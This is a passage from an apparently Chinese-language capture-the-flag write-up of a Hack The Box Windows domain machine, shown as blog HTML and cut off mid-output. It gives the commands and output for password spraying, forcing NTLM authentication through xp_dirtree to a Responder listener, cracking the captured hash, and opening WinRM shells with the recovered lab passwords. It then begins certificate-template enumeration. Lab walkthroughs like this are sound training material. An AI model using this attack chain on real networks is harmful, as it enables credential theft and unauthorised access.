sequel.htb\krbtgt:GuestUserCantWrite1                                                                                                      </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\DC$:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1</span><br></pre></td></tr></table></figure>
<p>呜呜呜我错了</p>
<h3 id="ntlm-hash-hijack"><a href="#ntlm-hash-hijack" class="headerlink" title="ntlm hash hijack"></a>ntlm hash hijack</h3><p>想起来有一个impacket-mssqlclient，用一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py PublicUser@sequel.htb              </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL (PublicUser  guest@master)&gt; </span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@master)&gt; enum_db       </span><br><span class="line">name     is_trustworthy_on                                                                       </span><br><span class="line">------   -----------------                                                                       </span><br><span class="line">master                   0                                                                       </span><br><span class="line">                                                                                                 </span><br><span class="line">tempdb                   0   </span><br><span class="line"></span><br><span class="line">model                    0   </span><br><span class="line"></span><br><span class="line">msdb                     1   </span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; enum_users;</span><br><span class="line">[%] EXEC sp_helpuser</span><br><span class="line">UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   </span><br><span class="line">------------------   --------   ---------   ---------   -------------   ----------   -----   </span><br><span class="line">dbo                  db_owner   sa          master      dbo             b<span class="string">&#x27;1         &#x27;</span>   b<span class="string">&#x27;01&#x27;</span>   </span><br><span class="line"></span><br><span class="line">guest                public     NULL        NULL        guest           b<span class="string">&#x27;2         &#x27;</span>   b<span class="string">&#x27;00&#x27;</span>   </span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA   public     NULL        NULL        NULL            b<span class="string">&#x27;3         &#x27;</span>    NULL   </span><br><span class="line"></span><br><span class="line">sys                  public     NULL        NULL        NULL            b<span class="string">&#x27;4         &#x27;</span>    NULL   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; enum_logins;</span><br><span class="line">[%] <span class="keyword">select</span> r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin from  master.sys.server_princi</span><br><span class="line">pals r left <span class="built_in">join</span> master.sys.syslogins sl on sl.sid = r.sid <span class="built_in">where</span> r.type <span class="keyword">in</span> (<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">name         type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   </span><br><span class="line">----------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   </span><br><span class="line">sa           SQL_LOGIN             0          1               0             0            0              0           0           0           0   </span><br><span class="line"></span><br><span class="line">PublicUser   SQL_LOGIN             0          0               0             0            0              0           0           0           0   </span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; exec_as_user sa;</span><br><span class="line">[%] execute as user=<span class="string">&#x27;sa;&#x27;</span>;</span><br><span class="line">[-] ERROR(DC\SQLMOCK): Line 1: Cannot execute as the database principal because the principal <span class="string">&quot;sa;&quot;</span> does not exist, this <span class="built_in">type</span> of principal cannot be impersonated, or you <span class="keyword">do</span> not have permission.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; xp_dirtree</span><br><span class="line">[%] <span class="built_in">exec</span> master.sys.xp_dirtree <span class="string">&#x27;&#x27;</span>,1,1</span><br><span class="line">subdirectory   depth   file   </span><br><span class="line">------------   -----   ----   </span><br></pre></td></tr></table></figure>
<p>只有一个xp_dirtree可以用了，捕获一下哈希</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mssqlclient</span></span><br><span class="line">SQL (PublicUser  guest@msdb)&gt; xp_dirtree \\10.10.xx.xx\wtf</span><br><span class="line">[%] <span class="built_in">exec</span> master.sys.xp_dirtree <span class="string">&#x27;\\10.10.xx.xx\wtf&#x27;</span>,1,1</span><br><span class="line">subdirectory   depth   file   </span><br><span class="line">------------   -----   ----   </span><br><span class="line"></span><br><span class="line"><span class="comment"># attacker</span></span><br><span class="line">$ <span class="built_in">sudo</span> responder -I tun0           </span><br><span class="line">[<span class="built_in">sudo</span>] wansh 的密码：              </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|             </span><br><span class="line">                                                </span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0</span><br><span class="line">。。。</span><br><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.228.253</span><br><span class="line">[SMB] NTLMv2-SSP Username : sequel\sql_svc</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:6a70418a9d8ff944:8E1A9D4D85A3A767E34BB54A66A5E2E1:010100000000000080A5E6F4E4B9DB01FAB0ABB16AB6BA840000000002000800590032005200380001001E00570049004E002D0032003200360052003000500059005A004E004700430004003400570049004E002D0032003200360052003000500059005A004E00470043002E0059003200520038002E004C004F00430041004C000300140059003200520038002E004C004F00430041004C000500140059003200520038002E004C004F00430041004C000700080080A5E6F4E4B9DB0106000400020000000800300030000000000000000000000000300000FA90285910D05096AA63E8D7615F591D4001CD78305A23CF9E82020B03A331D70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000</span><br></pre></td></tr></table></figure>
<p><a data-fancybox="gallery" data-src="/images/escape-2.png" data-caption=""><img src="/images/escape-2.png"></a><br>hashcat crack it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 5600 <span class="built_in">hash</span> /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt</span><br><span class="line">SQL_SVC::sequel:6a70418a9d8ff944:8e1a9d4d85a3a767e34bb54a66a5e2e1:010100000000000080a5e6f4e4b9db01fab0abb16ab6ba840000000002000800590032005200380001001e00570049004e002d0032003200360052003000500059005a004e004700430004003400570049004e002d0032003200360052003000500059005a004e00470043002e0059003200520038002e004c004f00430041004c000300140059003200520038002e004c004f00430041004c000500140059003200520038002e004c004f00430041004c000700080080a5e6f4e4b9db0106000400020000000800300030000000000000000000000000300000fa90285910d05096aa63e8d7615f591d4001cd78305a23cf9e82020b03a331d70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:REGGIE1234ronnie</span><br></pre></td></tr></table></figure>
<p>又有一个密码了，在喷射一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u user -p <span class="string">&quot;REGGIE1234ronnie&quot;</span> --continue-on-success   </span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\DC$:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Ryan.Cooper:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:REGGIE1234ronnie STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>
<p>行吧，还是sql_svc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm sequel.htb -u user -p <span class="string">&quot;REGGIE1234ronnie&quot;</span> --continue-on-success        </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Administrator:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Guest:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\krbtgt:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\DC$:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Tom.Henn:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Brandon.Brown:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Ryan.Cooper:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\James.Roberts:REGGIE1234ronnie</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Nicole.Thompson:REGGIE1234ronnie</span><br></pre></td></tr></table></figure>
<p>不行，还得是sql_svc</p>
<h2 id="shell-as-sql-svc"><a href="#shell-as-sql-svc" class="headerlink" title="shell as sql_svc"></a>shell as sql_svc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> evil-winrm -i dc.sequel.htb -u sql_svc -p <span class="string">&#x27;REGGIE1234ronnie&#x27;</span></span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; <span class="built_in">cd</span> ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\desktop&gt; <span class="built_in">dir</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\desktop&gt; </span><br></pre></td></tr></table></figure>
<p>在主目录下有一个SQLServer文件夹，进去翻一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\sql_svc\desktop&gt; <span class="built_in">cd</span> C:\                                                                                                                                   15:44:59 [9/367]</span><br><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">dir</span>                                                                         </span><br><span class="line">                                                                                                 </span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line">                                                                                                 </span><br><span class="line">                                                </span><br><span class="line">Mode                LastWriteTime         Length Name           </span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/1/2023   8:15 PM                PerfLogs</span><br><span class="line">d-r---         2/6/2023  12:08 PM                Program Files</span><br><span class="line">d-----       11/19/2022   3:51 AM                Program Files (x86)</span><br><span class="line">d-----       11/19/2022   3:51 AM                Public</span><br><span class="line">d-----         2/1/2023   1:02 PM                SQLServer</span><br><span class="line">d-r---         2/1/2023   1:55 PM                Users</span><br><span class="line">d-----         2/6/2023   7:21 AM                Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; <span class="built_in">cd</span> SQLServer</span><br><span class="line">*Evil-WinRM* PS C:\SQLServer&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQLServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         2/7/2023   8:06 AM                Logs</span><br><span class="line">d-----       11/18/2022   1:37 PM                SQLEXPR_2019</span><br><span class="line">-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe</span><br><span class="line">-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\SQLServer&gt; <span class="built_in">cd</span> Logs</span><br><span class="line">*Evil-WinRM* PS C:\SQLServer\Logs&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\SQLServer\Logs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\SQLServer\Logs&gt; download ERRORLOG.BAK</span><br><span class="line">                                         </span><br><span class="line">Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK</span><br><span class="line">                                         </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<h3 id="get-pass-at-bak"><a href="#get-pass-at-bak" class="headerlink" title="get pass at .bak"></a>get pass at .bak</h3><p>看一下这个备份文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.44 Logon       Logon failed <span class="keyword">for</span> user <span class="string">&#x27;sequel.htb\Ryan.Cooper&#x27;</span>. Reason: Password did not match that <span class="keyword">for</span> the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.</span><br><span class="line">2022-11-18 13:43:07.48 Logon       Logon failed <span class="keyword">for</span> user <span class="string">&#x27;NuclearMosquito3&#x27;</span>. Reason: Password did not match that <span class="keyword">for</span> the login provided. [CLIENT: 127.0.0.1]</span><br><span class="line">2022-11-18 13:43:07.72 spid51      Attempting to load library <span class="string">&#x27;xpstar.dll&#x27;</span> into memory. This is an informational message only. No user action is required.</span><br></pre></td></tr></table></figure>
<p>又要成盯真了<br>用<strong>NuclearMosquito3</strong>喷射一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u user -p <span class="string">&quot;NuclearMosquito3&quot;</span> --continue-on-success</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\DC$:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\sql_svc:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:NuclearMosquito3 STATUS_LOGON_FAILURE </span><br><span class="line"></span><br><span class="line">$ nxc winrm sequel.htb -u user -p <span class="string">&quot;NuclearMosquito3&quot;</span> --continue-on-success</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Administrator:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Guest:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\krbtgt:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\DC$:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Tom.Henn:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Brandon.Brown:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\sql_svc:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\James.Roberts:NuclearMosquito3</span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Nicole.Thompson:NuclearMosquito3</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-Ryan-Cooper"><a href="#shell-as-Ryan-Cooper" class="headerlink" title="shell as Ryan.Cooper"></a>shell as Ryan.Cooper</h2><p>（这里先去装一下bloodhound-ce）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -d sequel.htb -u ryan.cooper -p <span class="string">&quot;NuclearMosquito3&quot;</span> -c all -ns 10.129.228.253 --zip   </span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: sequel.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: dc.sequel.htb</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.sequel.htb</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 53 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.sequel.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 25S</span><br><span class="line">INFO: Compressing output into 20250430163207_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p>导进去看一下<br><a data-fancybox="gallery" data-src="/images/escape-3.png" data-caption=""><img src="/images/escape-3.png"></a><br>真乱呀</p>
<h3 id="ESC1-classic-abuse"><a href="#ESC1-classic-abuse" class="headerlink" title="ESC1 classic abuse"></a>ESC1 classic abuse</h3><p>看下证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ certipy find -u ryan.cooper@sequel.htb -p <span class="string">&quot;NuclearMosquito3&quot;</span>  -dc-ip 10.129.228.253</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span 